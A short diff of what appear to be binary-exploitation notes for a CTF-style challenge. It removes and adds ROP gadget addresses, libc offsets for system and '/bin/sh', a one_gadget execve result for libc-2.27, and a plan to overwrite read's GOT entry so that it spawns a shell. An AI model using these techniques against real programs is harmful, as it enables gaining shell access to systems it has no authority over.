@@ -1,20 +1,7 @@
-from ghidra we see that ret addr is at offset 24 from buff
-read function returns number of bytes read, and stores it in RAX register (the same that contains the id of the syscall when we do int 0x80): we can use this to write the value 0x3b (59) to execute the syscall execve
+0x0000000000400680: pop r14; pop r15; ret;
+0x00000000004005af: add qword ptr [r14 + 0x90], r15; ret;
 
-START OF SETVBUF IN LIBC:
-0x00005555554812f0 <+0>:	push   r13
+one_gadget libc-2.27.so
+  0x10a38c execve("/bin/sh", rsp+0x70, environ)
 
-0x00000000004005a7: pop rdi; ret;
-0x0000000000400681: pop rsi; pop r15; ret;
-
-readelf -s libc-2.27.so | grep system
-  1403: 000000000004f440    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
-
-strings -a -t x libc.so.6 | grep "/bin/sh"
- 1b3e9a /bin/sh
-
-0x00000000000cbceb: ret;
-0x000000000002155f: pop rdi; ret;
-0x00000000000439c8: pop rax; ret;
-0x000000000002cb49: pop rbx; ret;
-
+modify GOT table entry for read without leaks, by adding to it the offset between read (in libc) and one gadget (in libc)
